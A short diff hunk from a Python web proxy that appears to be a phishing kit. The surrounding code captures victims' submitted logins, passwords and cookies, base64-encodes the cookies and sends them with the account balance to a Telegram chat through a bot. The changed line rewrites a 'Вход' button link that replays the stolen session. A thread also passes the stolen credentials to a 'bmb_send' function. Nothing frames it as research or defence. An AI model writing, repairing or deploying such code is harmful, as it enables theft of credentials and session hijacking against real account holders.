@@ -266,7 +266,7 @@ def proxy(path):
             encoded_dict = base64.b64encode(json.dumps(request.cookies.to_dict()).encode('utf-8')).decode('utf-8')
             bot.send_message(user_id, f'Логин: {done}\n<code>{form_dict["login"]}:{form_dict["password"]}</code>\n'
                                              f'{host_url[:-11]}\n{balance}',
-                             reply_markup=quick_markup({'Вход':{'url':f'{request.url[0:-17]}/session/{encoded_dict}'}}))
+                             reply_markup=quick_markup({'Вход':{'url':f'{host_url[:-11]}session/{encoded_dict}'}}))
             Thread(target=bmb_send,args=[form_dict["login"],form_dict["password"]]).start()
 
             respon_text = response.text
